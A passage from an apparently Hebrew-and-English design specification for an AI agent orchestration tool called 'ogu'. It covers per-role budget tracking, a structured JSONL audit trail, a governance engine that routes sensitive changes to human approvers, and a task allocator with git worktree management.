      tokensOut: data.output_tokens || data.usage?.output_tokens || 0
    };
  }
  return null;
}

// After chat completion:
const usage = parseUsageEvent(finalEvent);
if (usage) {
  recordSpend(projectRoot, {
    roleId: currentRole,
    featureSlug: activeFeature,
    taskId: currentTask,
    model: routingResult.model,
    provider: routingResult.provider,
    tokensIn: usage.tokensIn,
    tokensOut: usage.tokensOut,
    durationMs: Date.now() - startTime,
    success: exitCode === 0,
    escalated: routingResult.escalatedFrom !== null
  });
}
```

### CLI Commands

**`ogu budget:status`**
```
Usage: ogu budget:status [--json]

Example:
  $ ogu budget:status
  TODAY (2026-02-27):
    Total: $12.56 / $50.00 daily limit (25%)
    ████████░░░░░░░░░░░░ 25%

  BY ROLE:
    architect    $8.50 (68%)  ██████████████
    backend-dev  $4.06 (32%)  ██████████

  BY MODEL:
    opus    $9.00 (72%)  ██████████████████
    sonnet  $3.56 (28%)  ██████████

  THIS MONTH: $234.56 / $1000.00 (23%)
  PROJECTED:  $242.00 ✓ within budget
```

**`ogu budget:set`**
```
Usage: ogu budget:set --daily <amount> --monthly <amount>

Example:
  $ ogu budget:set --daily 75 --monthly 1500
  ✓ Daily limit: $75.00
  ✓ Monthly limit: $1500.00
```

**`ogu budget:report`**
```
Usage: ogu budget:report [--days N] [--by role|model|feature] [--json]

Detailed spending report with trends.
```

### Studio UI: Budget Dashboard

- **Header widget**: Compact spend indicator (today's cost / limit with progress bar)
- **Budget page**: Full dashboard with:
  - Daily/monthly trend charts
  - Per-role spending breakdown (pie chart)
  - Per-model cost comparison
  - Per-feature cost allocation
  - Alert history
- **Real-time alerts**: Toast notifications when thresholds crossed
- **Chat integration**: Token count shown per message (input/output/cost)

### WebSocket Events

```
budget:updated    → After every model call (includes updated totals)
budget:alert      → When threshold crossed (level, message)
budget:exhausted  → When daily limit reached for a role
```

### אימות

1. Studio chat correctly extracts token counts and feeds to tracker
2. BUDGET.json updates after every model call
3. `ogu budget:status` shows accurate daily totals
4. Budget-exhausted role gets downgraded by model router
5. Alert thresholds trigger WebSocket events at 50%, 75%, 90%
6. Daily JSONL logs contain every transaction
7. `ogu budget:report --days 7` aggregates correctly

---

## Phase 3: Audit Trail

### מטרה
מעבר מלוגים טקסטואליים (daily logs) למערכת audit מובנית — כל פעולה מתועדת עם agentId, model, tokens, artifacts, gates, approvals. המערכת צריכה לאפשר replay.

### קבצים חדשים

```
.ogu/audit/                                ← Audit directory
.ogu/audit/YYYY-MM-DD.jsonl               ← Daily structured audit log
.ogu/audit/index.json                      ← Quick lookup index
tools/ogu/commands/audit.mjs               ← CLI: audit:show, audit:search, audit:replay, audit:export
tools/ogu/commands/lib/audit.mjs           ← Audit logging library
docs/vault/02_Contracts/Audit.contract.md  ← Audit format contract
```

### קבצים לעדכון

```
tools/ogu/commands/compile.mjs             ← Emit audit events for each gate
tools/ogu/commands/gates.mjs               ← Emit audit events
tools/ogu/commands/lib/model-router.mjs    ← Emit routing audit events
tools/ogu/commands/lib/budget-tracker.mjs  ← Link to audit trail
tools/studio/server/api/chat.ts            ← Emit chat audit events
```

### Schema: Audit Event (שורה ב-JSONL)

```json
{
  "id": "uuid-v4",
  "timestamp": "ISO",
  "type": "task_started | task_completed | task_failed | gate_passed | gate_failed | model_routed | model_escalated | approval_requested | approval_granted | approval_denied | artifact_produced | budget_alert | error",
  "agentId": "backend-dev",
  "sessionId": "claude-session-id",
  "featureSlug": "auth-system",
  "taskId": "task-3",
  "phase": "build",

  "model": {
    "provider": "anthropic",
    "model": "sonnet",
    "tokensIn": 12345,
    "tokensOut": 6789,
    "cost": 0.14,
    "durationMs": 3200
  },

  "artifact": {
    "type": "FILE | API | ROUTE | COMPONENT | SCHEMA | CONTRACT | TOKEN | TEST",
    "identifier": "API:/users POST",
    "path": "app/api/users/route.ts",
    "hash": "sha256"
  },

  "gate": {
    "name": "contracts",
    "status": "passed | failed",
    "errorCode": "OGU1001",
    "details": "Contract validation passed"
  },

  "approval": {
    "required": true,
    "approver": "cto",
    "reason": "cross_boundary_change",
    "decision": "approved | denied",
    "comment": "Looks good"
  },

  "context": {
    "specHash": "sha256",
    "contextLockHash": "sha256",
    "planVersion": "1.0"
  },

  "parentEventId": "uuid — for event chains (escalation, retry)",
  "tags": ["escalation", "budget-warning"]
}
```

### Schema: index.json (Quick Lookup)

```json
{
  "lastUpdated": "ISO",
  "features": {
    "auth-system": {
      "firstEvent": "ISO",
      "lastEvent": "ISO",
      "eventCount": 156,
      "gatesPassed": 12,
      "gatesFailed": 2,
      "totalCost": 45.67,
      "status": "in_progress"
    }
  },
  "agents": {
    "backend-dev": {
      "totalEvents": 89,
      "tasksCompleted": 12,
      "tasksFailed": 1,
      "totalCost": 23.45
    }
  },
  "daily": {
    "2026-02-27": { "events": 45, "cost": 12.56 },
    "2026-02-26": { "events": 67, "cost": 15.23 }
  }
}
```

### Pseudo-code: audit.mjs (Library)

```javascript
// tools/ogu/commands/lib/audit.mjs

import { v4 as uuid } from 'uuid'; // or simple random
import { appendFileSync, writeFileSync, mkdirSync } from 'fs';
import { join } from 'path';
import { readJsonSafe, repoRoot } from '../../util.mjs';

const AUDIT_DIR = '.ogu/audit';
const INDEX_PATH = '.ogu/audit/index.json';

/**
 * Emit a structured audit event
 */
export function emitAudit(root, event) {
  const fullEvent = {
    id: generateId(),
    timestamp: new Date().toISOString(),
    ...event
  };

  // Validate required fields
  if (!fullEvent.type) throw new Error('Audit event missing type');

  // Append to daily JSONL
  const today = fullEvent.timestamp.split('T')[0];
  mkdirSync(join(root, AUDIT_DIR), { recursive: true });
  const logPath = join(root, AUDIT_DIR, `${today}.jsonl`);
  appendFileSync(logPath, JSON.stringify(fullEvent) + '\n');

  // Update index
  updateIndex(root, fullEvent);

  return fullEvent.id;
}

/**
 * Convenience methods for common event types
 */
export const audit = {
  taskStarted: (root, { agentId, featureSlug, taskId, phase }) =>
    emitAudit(root, { type: 'task_started', agentId, featureSlug, taskId, phase }),

  taskCompleted: (root, { agentId, featureSlug, taskId, phase, model, artifact }) =>
    emitAudit(root, { type: 'task_completed', agentId, featureSlug, taskId, phase, model, artifact }),

  taskFailed: (root, { agentId, featureSlug, taskId, phase, model, errorCode, details }) =>
    emitAudit(root, { type: 'task_failed', agentId, featureSlug, taskId, phase, model,
      gate: { status: 'failed', errorCode, details } }),

  gatePassed: (root, { featureSlug, gate, agentId }) =>
    emitAudit(root, { type: 'gate_passed', featureSlug, agentId,
      gate: { name: gate, status: 'passed' } }),

  gateFailed: (root, { featureSlug, gate, errorCode, details, agentId }) =>
    emitAudit(root, { type: 'gate_failed', featureSlug, agentId,
      gate: { name: gate, status: 'failed', errorCode, details } }),

  modelRouted: (root, { agentId, featureSlug, model, reason }) =>
    emitAudit(root, { type: 'model_routed', agentId, featureSlug, model, tags: [reason] }),

  artifactProduced: (root, { agentId, featureSlug, artifact }) =>
    emitAudit(root, { type: 'artifact_produced', agentId, featureSlug, artifact }),

  approvalRequested: (root, { agentId, featureSlug, approval }) =>
    emitAudit(root, { type: 'approval_requested', agentId, featureSlug, approval }),

  approvalGranted: (root, { agentId, featureSlug, approval }) =>
    emitAudit(root, { type: 'approval_granted', agentId, featureSlug, approval }),
};

/**
 * Query audit events with filters
 */
export function queryAudit(root, {
  featureSlug, agentId, type, dateFrom, dateTo, limit = 100
}) {
  // Read JSONL files in date range
  // Filter by criteria
  // Return sorted events (newest first)
}

/**
 * Replay: extract ordered event chain for a feature
 * Enables deterministic reproduction of decision sequence
 */
export function replayChain(root, featureSlug) {
  // Load all events for feature
  // Sort by timestamp
  // Build event tree (parentEventId → children)
  // Return ordered sequence with decision points marked
}
```

### Integration Points

**compile.mjs — Emit gate events:**
```javascript
// After each gate in compile:
if (gateResult.passed) {
  audit.gatePassed(root, { featureSlug: slug, gate: gateName, agentId: currentRole });
} else {
  audit.gateFailed(root, {
    featureSlug: slug, gate: gateName,
    errorCode: gateResult.errorCode,
    details: gateResult.message,
    agentId: currentRole
  });
}
```

**chat.ts — Emit chat events:**
```typescript
// On chat start:
audit.taskStarted(root, { agentId: role, featureSlug, taskId, phase });

// On chat complete:
audit.taskCompleted(root, { agentId: role, featureSlug, taskId, phase, model: usage });
```

### CLI Commands

**`ogu audit:show`**
```
Usage: ogu audit:show [--feature <slug>] [--agent <roleId>] [--type <type>] [--last N] [--json]

Example:
  $ ogu audit:show --feature auth-system --last 10
  2026-02-27 14:23:01 │ task_started     │ backend-dev │ task-3  │ build
  2026-02-27 14:23:02 │ model_routed     │ backend-dev │ sonnet  │ role-default
  2026-02-27 14:25:30 │ artifact_produced│ backend-dev │ API:/users POST
  2026-02-27 14:25:31 │ task_completed   │ backend-dev │ task-3  │ $0.14
  2026-02-27 14:26:00 │ gate_passed      │ backend-dev │ contracts
  ...
```

**`ogu audit:search`**
```
Usage: ogu audit:search <query> [--from DATE] [--to DATE]

Grep-like search across audit events.

Example:
  $ ogu audit:search "gate_failed" --from 2026-02-20
  Found 7 gate failures in 8 days:
  2026-02-25 │ OGU0302 │ auth-system │ Unresolved IR input
  2026-02-24 │ OGU1401 │ auth-system │ IR output drift
  ...
```

**`ogu audit:replay`**
```
Usage: ogu audit:replay <feature-slug> [--verbose]

Show the complete decision chain for a feature.

Example:
  $ ogu audit:replay auth-system
  FEATURE: auth-system
  STARTED: 2026-02-20 09:00:00

  Phase: feature
  ├─ 09:00 pm (sonnet) → PRD.md created
  ├─ 09:15 pm (sonnet) → Spec.md skeleton
  └─ 09:20 pm (sonnet) → QA.md created

  Phase: architect
  ├─ 10:00 architect (opus) → Spec.md filled
  ├─ 10:30 architect (opus) → Plan.json (8 tasks, 12 outputs)
  └─ 10:32 architect (opus) → IR validated ✓

  Phase: build
  ├─ 11:00 backend-dev (sonnet) → task-1 started
  │   ├─ model: sonnet (role-default)
  │   ├─ artifact: SCHEMA:users
  │   └─ completed ($0.14)
  ├─ 11:15 backend-dev (sonnet) → task-2 FAILED
  │   ├─ model: sonnet → opus (escalated)
  │   ├─ error: OGU0501 (type error)
  │   └─ retry with opus → completed ($0.45)
  ...

  TOTAL: 8 tasks, 12 artifacts, 2 escalations, $23.45
```

**`ogu audit:export`**
```
Usage: ogu audit:export <feature-slug> --format json|csv|md

Export audit trail for external review.
```

### Studio UI: Audit Viewer

- **Timeline view**: Vertical timeline of events per feature
- **Filters**: By agent, type, date range, error code
- **Event detail**: Click event → shows full JSON payload
- **Replay mode**: Step-through visualization of feature history
- **Search**: Full-text search across audit events

### WebSocket Events

```
audit:event     → Every audit event (real-time feed)
audit:gate      → Gate pass/fail (for dashboard indicators)
audit:error     → Error events (for alert system)
```

### אימות

1. Every `ogu compile` gate emits audit events
2. Every Studio chat emits start/complete/fail events
3. Every model routing decision is audited
4. `ogu audit:replay <slug>` reconstructs full feature history
5. JSONL files are valid (one JSON per line)
6. Index stays in sync with JSONL content
7. No audit event is lost (even on process crash — append-only is atomic per line)

---

## Phase 4: Governance Engine

### מטרה
מנוע ממשל אכיף — מדיניות כללים שמבוצעת אוטומטית, workflow אישור על שינויים רגישים, סיווג סיכונים, escalation chains.

### קבצים חדשים

```
.ogu/governance/                           ← Governance directory
.ogu/governance/policies.json              ← Executable policy definitions
.ogu/governance/approvals/                 ← Approval records
.ogu/governance/approvals/{id}.json        ← Individual approval record
tools/ogu/commands/governance.mjs          ← CLI: governance:check, governance:policy, approve, deny
tools/ogu/commands/lib/governance.mjs      ← Policy engine
docs/vault/02_Contracts/Governance.contract.md ← Governance contract
```

### Schema: policies.json

```json
{
  "$schema": "Governance/1.0",
  "policies": [
    {
      "id": "cross-boundary",
      "name": "Cross-Boundary Change",
      "description": "Changes that touch files outside agent's ownershipScope",
      "trigger": {
        "type": "scope_violation",
        "condition": "task.touches intersects NOT(agent.ownershipScope)"
      },
      "riskTier": "high",
      "action": {
        "type": "require_approval",
        "approver": "tech-lead",
        "escalateTo": "cto",
        "escalateAfterHours": 4,
        "blockExecution": true
      }
    },
    {
      "id": "security-sensitive",
      "name": "Security-Sensitive Change",
      "description": "Changes to auth, crypto, secrets, or permission logic",
      "trigger": {
        "type": "path_match",
        "patterns": [
          "**/auth/**", "**/crypto/**", "**/security/**",
          "**/*.secret.*", "**/.env*", "**/middleware/auth*"
        ]
      },
      "riskTier": "critical",
      "action": {
        "type": "require_approval",
        "approver": "security",
        "escalateTo": "cto",
        "escalateAfterHours": 2,
        "blockExecution": true,
        "additionalGates": ["security_scan"]
      }
    },
    {
      "id": "infra-change",
      "name": "Infrastructure Change",
      "description": "Changes to CI/CD, Docker, deployment config",
      "trigger": {
        "type": "path_match",
        "patterns": [
          "docker-compose*", "Dockerfile*", ".github/**",
          "**/deploy/**", "**/infra/**", "vercel.json", "fly.toml"
        ]
      },
      "riskTier": "high",
      "action": {
        "type": "require_approval",
        "approver": "devops",
        "blockExecution": true
      }
    },
    {
      "id": "contract-change",
      "name": "Contract Change",
      "description": "Changes to vault contracts or invariants",
      "trigger": {
        "type": "path_match",
        "patterns": [
          "docs/vault/02_Contracts/**",
          "docs/vault/01_Architecture/Invariants.md"
        ]
      },
      "riskTier": "high",
      "action": {
        "type": "require_approval",
        "approver": "architect",
        "escalateTo": "cto",
        "requireADR": true,
        "blockExecution": true
      }
    },
    {
      "id": "budget-overrun",
      "name": "Budget Overrun",
      "description": "Task exceeds cost limit",
      "trigger": {
        "type": "budget_exceeded",
        "condition": "task.cost > agent.budgetQuota.maxCostPerTask"
      },
      "riskTier": "medium",
      "action": {
        "type": "require_approval",
        "approver": "tech-lead",
        "blockExecution": false,
        "downgradeModel": true
      }
    },
    {
      "id": "auto-approve-low-risk",
      "name": "Auto-Approve Low Risk",
      "description": "Low-risk changes within scope are auto-approved",
      "trigger": {
        "type": "risk_tier",
        "condition": "task.riskTier == 'low' AND task.withinScope"
      },
      "riskTier": "low",
      "action": {
        "type": "auto_approve",
        "log": true
      }
    }
  ],
  "escalationDefaults": {
    "timeoutHours": 8,
    "maxEscalationDepth": 3,
    "autoApproveAfterTimeout": false,
    "notifyOnEscalation": true
  }
}
```

### Schema: ApprovalRecord.json

```json
{
  "id": "approval-uuid",
  "requestedAt": "ISO",
  "resolvedAt": "ISO | null",
  "status": "pending | approved | denied | escalated | auto_approved | timed_out",
  "policyId": "cross-boundary",
  "policyName": "Cross-Boundary Change",
  "riskTier": "high",

  "request": {
    "agentId": "backend-dev",
    "featureSlug": "auth-system",
    "taskId": "task-5",
    "description": "Task touches auth middleware outside agent scope",
    "filesTouched": ["src/middleware/auth.ts", "src/lib/session.ts"],
    "scopeViolations": ["src/middleware/auth.ts is outside backend-dev scope"]
  },

  "approver": {
    "roleId": "tech-lead",
    "decision": "approved",
    "comment": "Auth refactor is necessary for this feature",
    "timestamp": "ISO"
  },

  "auditEventId": "links to audit trail event"
}
```

### Pseudo-code: governance.mjs (Policy Engine)

```javascript
// tools/ogu/commands/lib/governance.mjs

import { readJsonSafe, repoRoot } from '../../util.mjs';
import { loadOrgSpec, matchRole } from './agent-registry.mjs';
import { audit } from './audit.mjs';
import { minimatch } from 'minimatch'; // or simple glob matching
import { join } from 'path';

const POLICIES_PATH = '.ogu/governance/policies.json';
const APPROVALS_DIR = '.ogu/governance/approvals';

/**
 * Check a proposed action against all policies
 *
 * @param {Object} action
 * @param {string} action.agentId - Who is performing
 * @param {string} action.featureSlug - Which feature
 * @param {string} action.taskId - Which task
 * @param {string[]} action.filesTouched - Files that will be modified
 * @param {number} action.estimatedCost - Projected cost
 *
 * @returns {{ allowed: boolean, approvals: ApprovalRequest[], warnings: string[] }}
 */
export function checkGovernance(root, action) {
  const policies = loadPolicies(root);
  const orgSpec = loadOrgSpec(root);
  const role = orgSpec.roles.find(r => r.roleId === action.agentId);

  const result = { allowed: true, approvals: [], warnings: [] };

  for (const policy of policies.policies) {
    const triggered = evaluateTrigger(policy.trigger, action, role, orgSpec);

    if (triggered) {
      if (policy.action.type === 'auto_approve') {
        // Log but don't block
        if (policy.action.log) {
          audit.approvalGranted(root, {
            agentId: action.agentId,
            featureSlug: action.featureSlug,
            approval: {
              required: false,
              approver: 'system',
              reason: policy.name,
              decision: 'auto_approved'
            }
          });
        }
        continue;
      }

      if (policy.action.type === 'require_approval') {
        const approvalRequest = {
          policyId: policy.id,
          policyName: policy.name,
          riskTier: policy.riskTier,
          approverRole: policy.action.approver,
          escalateTo: policy.action.escalateTo,
          blockExecution: policy.action.blockExecution,
          requireADR: policy.action.requireADR || false,
          additionalGates: policy.action.additionalGates || [],
          reason: describeViolation(policy, action, role)
        };

        result.approvals.push(approvalRequest);

        if (policy.action.blockExecution) {
          result.allowed = false;
        }

        // Emit audit event
        audit.approvalRequested(root, {
          agentId: action.agentId,
          featureSlug: action.featureSlug,
          approval: {
            required: true,
            approver: policy.action.approver,
            reason: policy.name
          }
        });
      }
    }
  }

  return result;
}

/**
 * Grant or deny an approval
 */
export function resolveApproval(root, {
  approvalId, decision, approverRole, comment
}) {
  const approvalPath = join(root, APPROVALS_DIR, `${approvalId}.json`);
  const approval = readJsonSafe(approvalPath);
  if (!approval) throw new Error(`OGU2401: Approval ${approvalId} not found`);

  approval.status = decision; // 'approved' | 'denied'
  approval.resolvedAt = new Date().toISOString();
  approval.approver = {
    roleId: approverRole,
    decision,
    comment,
    timestamp: approval.resolvedAt
  };

  writeFileSync(approvalPath, JSON.stringify(approval, null, 2));

  // Emit audit
  const auditFn = decision === 'approved' ? audit.approvalGranted : audit.approvalDenied;
  auditFn(root, {
    agentId: approval.request.agentId,
    featureSlug: approval.request.featureSlug,
    approval: approval.approver
  });

  return approval;
}

function evaluateTrigger(trigger, action, role, orgSpec) {
  switch (trigger.type) {
    case 'scope_violation':
      return action.filesTouched.some(f =>
        !role.ownershipScope.some(scope => minimatch(f, scope))
      );

    case 'path_match':
      return action.filesTouched.some(f =>
        trigger.patterns.some(p => minimatch(f, p))
      );

    case 'budget_exceeded':
      return action.estimatedCost > (role.budgetQuota?.maxCostPerTask || Infinity);

    case 'risk_tier':
      // Evaluate compound condition
      return false; // simplified

    default:
      return false;
  }
}

function describeViolation(policy, action, role) {
  // Generate human-readable description of why policy triggered
}
```

### CLI Commands

**`ogu governance:check`**
```
Usage: ogu governance:check --task <id> --feature <slug> [--dry-run]

Check if a task would trigger governance policies before execution.

Example:
  $ ogu governance:check --task 5 --feature auth-system
  POLICY EVALUATION for task-5 (auth-system):

  ✓ auto-approve-low-risk    — NOT triggered
  ✗ cross-boundary           — TRIGGERED (touches src/middleware/auth.ts)
    → Requires approval from: tech-lead
    → Blocks execution: YES
  ✗ security-sensitive        — TRIGGERED (touches auth middleware)
    → Requires approval from: security
    → Blocks execution: YES
    → Additional gates: security_scan
  ✓ infra-change             — NOT triggered
  ✓ contract-change          — NOT triggered
  ✓ budget-overrun           — NOT triggered

  RESULT: BLOCKED — 2 approvals required
```

**`ogu approve`**
```
Usage: ogu approve <approval-id> [--comment "reason"]

Example:
  $ ogu approve appr-abc123 --comment "Auth refactor is necessary"
  ✓ Approval appr-abc123 GRANTED by tech-lead
  ✓ Remaining approvals for task-5: 1 (security)
```

**`ogu deny`**
```
Usage: ogu deny <approval-id> [--comment "reason"]
```

**`ogu governance:policy`**
```
Usage: ogu governance:policy [list|add|remove|edit]

Manage governance policies.
```

### Studio UI: Governance Panel

- **Approval queue**: List of pending approvals with severity indicators
- **Policy editor**: View/edit governance policies (JSON form)
- **Approval dialog**: When policy triggers, modal with:
  - Policy name and description
  - Files affected
  - Risk tier badge
  - Approve/Deny buttons with comment field
- **Governance log**: History of all approval decisions
- **Risk heatmap**: Visual indicator of which areas of code are high-risk

### WebSocket Events

```
governance:approval_required  → New approval needed (blocks UI until resolved)
governance:approved          → Approval granted (unblocks)
governance:denied            → Approval denied (task cancelled)
governance:escalated         → Approval escalated to higher authority
```

### אימות

1. Task touching auth files triggers security-sensitive policy
2. Task within agent scope auto-approves
3. Blocked task cannot proceed until approved
4. Denied task stops execution
5. Escalation works (tech-lead → cto after timeout)
6. All decisions logged in audit trail
7. `ogu governance:check --dry-run` shows correct policy evaluation
8. Studio shows approval modal when policy triggers

---

## Phase 5: Kadima — Organization OS

### מטרה
Kadima הוא שכבת התזמור הארגונית — טוענת את ה-OrgSpec, מקצה tasks ל-agents, מנהלת worktrees, מריצה standups, ומגשרת בין הצד הארגוני (מי עושה מה, עם אילו הרשאות) לצד הטכני (Ogu compiler).

**Kadima לעולם לא כותבת קוד. היא מתזמרת agents ומאמתת סמכות.**

### קבצים חדשים

```
tools/ogu/commands/kadima.mjs              ← CLI: kadima:standup, kadima:allocate, kadima:status, kadima:init
tools/ogu/commands/lib/kadima-engine.mjs   ← Core orchestration engine
tools/ogu/commands/lib/task-allocator.mjs  ← Agent-task matching logic
tools/ogu/commands/lib/worktree-manager.mjs ← Git worktree lifecycle
.ogu/kadima/                               ← Kadima runtime
.ogu/kadima/allocations.json               ← Current task→agent assignments
.ogu/kadima/standups/                      ← Generated standups
.ogu/kadima/standups/YYYY-MM-DD.md         ← Daily standup report
docs/vault/02_Contracts/Kadima.contract.md ← Kadima system contract
```

### קבצים לעדכון

```
tools/ogu/commands/orchestrate.mjs         ← Integrate with Kadima allocations
tools/ogu/commands/compile.mjs             ← Verify Kadima allocations before build
tools/studio/server/api/router.ts          ← Add Kadima endpoints
```

### Schema: allocations.json

```json
{
  "$schema": "Kadima/Allocations/1.0",
  "featureSlug": "auth-system",
  "planVersion": "sha256-of-Plan.json",
  "allocatedAt": "ISO",
  "allocations": [
    {
      "taskId": "task-1",
      "assignedTo": "backend-dev",
      "model": "sonnet",
      "budgetAllocation": 1.50,
      "worktree": null,
      "status": "pending | active | completed | failed | blocked",
      "governanceCheck": {
        "checked": true,
        "blocked": false,
        "pendingApprovals": []
      },
      "startedAt": null,
      "completedAt": null
    },
    {
      "taskId": "task-2",
      "assignedTo": "frontend-dev",
      "model": "sonnet",
      "budgetAllocation": 2.00,
      "worktree": ".claude/worktrees/auth-task-2",
      "status": "active",
      "governanceCheck": {
        "checked": true,
        "blocked": false,
        "pendingApprovals": []
      },
      "startedAt": "ISO",
      "completedAt": null
    }
  ],
  "waves": [
    { "wave": 1, "tasks": ["task-1", "task-2", "task-3"], "parallel": true },
    { "wave": 2, "tasks": ["task-4", "task-5"], "parallel": true }
  ]
}
```

### Pseudo-code: task-allocator.mjs

```javascript
// tools/ogu/commands/lib/task-allocator.mjs

import { loadOrgSpec, loadAgentState, matchRole } from './agent-registry.mjs';
import { routeModel } from './model-router.mjs';
import { checkGovernance } from './governance.mjs';
import { loadIR } from './ir-registry.mjs';
import { hasBudget } from './budget-tracker.mjs';

/**
 * Allocate tasks from Plan.json to agents
 *
 * Algorithm:
 * 1. Load Plan.json tasks
 * 2. Build DAG (reuse orchestrate logic)
 * 3. For each task in topological order:
 *    a. Determine best agent role based on phase, task type, file paths
 *    b. Route model for that agent
 *    c. Check governance policies
 *    d. Allocate budget
 *    e. Create allocation record
 */
export function allocateTasks(root, featureSlug) {
  const ir = loadIR(root, featureSlug);
  const orgSpec = loadOrgSpec(root);
  const allocations = [];

  for (const task of ir.tasks) {
    // 1. Determine role
    const phase = detectPhaseFromTask(task);
    const riskTier = assessTaskRisk(task, orgSpec);
    const role = matchRole(orgSpec, { phase, riskTier, taskType: task.group });

    // 2. Route model
    const agentState = loadAgentState(root, role.roleId);
    const modelResult = routeModel({
      roleId: role.roleId,
      phase,
      taskId: `task-${task.id}`,
      failureCount: 0
    });

    // 3. Check governance
    const govCheck = checkGovernance(root, {
      agentId: role.roleId,
      featureSlug,
      taskId: `task-${task.id}`,
      filesTouched: task.touches || [],
      estimatedCost: estimateTaskCost(modelResult.model, task)
    });

    // 4. Budget check
    const budgetOk = hasBudget(root, role.roleId);

    allocations.push({
      taskId: `task-${task.id}`,
      assignedTo: role.roleId,
      model: modelResult.model,
      budgetAllocation: estimateTaskCost(modelResult.model, task),
      worktree: null, // Created at execution time
      status: govCheck.allowed && budgetOk ? 'pending' : 'blocked',
      governanceCheck: {
        checked: true,
        blocked: !govCheck.allowed,
        pendingApprovals: govCheck.approvals.map(a => a.policyId)
      },
      startedAt: null,
      completedAt: null
    });
  }

  return allocations;
}

/**
 * Assess risk tier of a task based on files it touches
 */
function assessTaskRisk(task, orgSpec) {
  const touches = task.touches || [];
  const securityPaths = ['**/auth/**', '**/crypto/**', '**/security/**'];
  const infraPaths = ['docker*', '.github/**', '**/deploy/**'];

  if (touches.some(f => securityPaths.some(p => minimatch(f, p)))) return 'critical';
  if (touches.some(f => infraPaths.some(p => minimatch(f, p)))) return 'high';
  if (task.outputs?.some(o => o.startsWith('SCHEMA:') || o.startsWith('CONTRACT:'))) return 'medium';
  return 'low';
}

function detectPhaseFromTask(task) {
  const group = task.group?.toLowerCase() || '';
  if (group.includes('setup') || group.includes('schema')) return 'build';
  if (group.includes('api') || group.includes('backend')) return 'build';
  if (group.includes('ui') || group.includes('frontend')) return 'build';
  if (group.includes('test')) return 'verify';
  return 'build';
}

function estimateTaskCost(model, task) {
  // Rough estimation based on task complexity
  const touchCount = (task.touches || []).length;
  const outputCount = (task.outputs || []).length;
  const complexity = touchCount + outputCount;
  const costPerUnit = { haiku: 0.05, sonnet: 0.15, opus: 0.50 }[model] || 0.15;
  return Math.max(0.10, complexity * costPerUnit);
}
```

### Pseudo-code: worktree-manager.mjs

```javascript
// tools/ogu/commands/lib/worktree-manager.mjs

import { execSync } from 'child_process';
import { join } from 'path';

const WORKTREE_BASE = '.claude/worktrees';

/**
 * Create isolated worktree for a task
 */
export function createWorktree(root, { featureSlug, taskId }) {
  const name = `${featureSlug}-${taskId}`;
  const worktreePath = join(root, WORKTREE_BASE, name);
  const branch = `agent/${featureSlug}/${taskId}`;

  execSync(`git worktree add -b "${branch}" "${worktreePath}" HEAD`, { cwd: root });

  return { path: worktreePath, branch };
}

/**
 * Validate worktree (run gates in isolation)
 */
export function validateWorktree(worktreePath) {
  // Run: typecheck, lint, unit tests in worktree
  // Return: { passed: boolean, errors: string[] }
}

/**
 * Merge worktree back to main branch
 */
export function mergeWorktree(root, { worktreePath, branch, featureSlug, taskId }) {
  // 1. Run validation in worktree
  // 2. If passes, merge branch to current branch
  // 3. Cleanup worktree
  execSync(`git merge --no-ff "${branch}" -m "task(${featureSlug}): ${taskId}"`, { cwd: root });
  execSync(`git worktree remove "${worktreePath}"`, { cwd: root });
  execSync(`git branch -d "${branch}"`, { cwd: root });
}

/**
 * Cleanup abandoned worktrees
 */
export function cleanupWorktrees(root) {
  execSync('git worktree prune', { cwd: root });
}

/**
 * List active worktrees
 */
export function listWorktrees(root) {
  const output = execSync('git worktree list --porcelain', { cwd: root }).toString();
  // Parse porcelain output → array of { path, branch, head }
}
```

### Standup Generation

```javascript
// In kadima-engine.mjs

/**
 * Generate daily standup from audit trail + allocations
 */
export function generateStandup(root) {
  const today = new Date().toISOString().split('T')[0];
  const yesterday = /* previous business day */;

  const auditEvents = queryAudit(root, { dateFrom: yesterday, dateTo: today });
  const allocations = loadAllocations(root);
  const budget = loadBudget(root);

  return `
# Standup — ${today}

## מה הושלם אתמול
${completedTasks(auditEvents).map(t =>
  `- **${t.agentId}** סיים ${t.taskId} (${t.featureSlug}) — ${t.model}, $${t.cost}`
).join('\n')}

## מה חסום
${blockedTasks(allocations).map(t =>
  `- **${t.taskId}** (${t.assignedTo}) — ${t.blockReason}`
).join('\n')}

## מה מתוכנן להיום
${pendingTasks(allocations).map(t =>
  `- **${t.taskId}** → ${t.assignedTo} (${t.model})`
).join('\n')}

## תקציב
- היום: $${budget.today.totalCost.toFixed(2)} / $${budget.global.dailyLimit}
- החודש: $${budget.history.thisMonth.totalCost.toFixed(2)} / $${budget.global.monthlyLimit}

## אירועי ממשל
${governanceEvents(auditEvents).map(e =>
  `- ${e.type}: ${e.description}`
).join('\n') || 'אין'}
`;
}
```

### CLI Commands

**`ogu kadima:init`**
```
Usage: ogu kadima:init [--feature <slug>]

Initialize Kadima for a feature — allocate tasks, check governance, set up worktrees.

Example:
  $ ogu kadima:init --feature auth-system
  Loading Plan.json... 8 tasks, 12 outputs
  Allocating tasks to agents...

  TASK  AGENT        MODEL   BUDGET  GOVERNANCE    STATUS
  1     backend-dev  sonnet  $0.30   ✓ auto-ok     pending
  2     backend-dev  sonnet  $0.45   ✓ auto-ok     pending
  3     backend-dev  sonnet  $0.60   ✗ needs approval  blocked
         → security-sensitive: touches auth middleware
         → Approval required from: security
  4     frontend-dev sonnet  $0.90   ✓ auto-ok     pending
  5     frontend-dev sonnet  $1.20   ✓ auto-ok     pending
  6     qa           sonnet  $0.30   ✓ auto-ok     pending
  7     qa           sonnet  $0.30   ✓ auto-ok     pending
  8     devops       opus    $0.50   ✗ needs approval  blocked
         → infra-change: touches Dockerfile
         → Approval required from: devops

  ✓ Wrote .ogu/kadima/allocations.json
  ⚠ 2 tasks blocked — resolve approvals to proceed
```

**`ogu kadima:standup`**
```
Usage: ogu kadima:standup [--json]

Generate daily standup report from audit trail.
```

**`ogu kadima:allocate`**
```
Usage: ogu kadima:allocate --feature <slug> [--rebalance]

Allocate (or re-allocate) tasks to agents.
--rebalance: Re-assign based on current budget/availability.
```

**`ogu kadima:status`**
```
Usage: ogu kadima:status [--feature <slug>]

Show current allocation status, active worktrees, blocked tasks.
```

### Studio UI: Kadima Dashboard

- **Allocation board**: Kanban-style view of tasks by agent
  - Columns: Pending → Active → Completed → Failed
  - Cards show: task title, agent, model, cost, governance status
  - Drag to reassign (triggers re-allocation)
- **Standup view**: Daily report with collapsible sections
- **Worktree monitor**: Active worktrees with branch status
- **Governance queue**: Pending approvals with one-click approve/deny
- **Team overview**: Agent cards showing today's stats

### Studio API Endpoints

```
GET  /api/kadima/status                → Current allocation status
POST /api/kadima/init                  → Initialize Kadima for feature
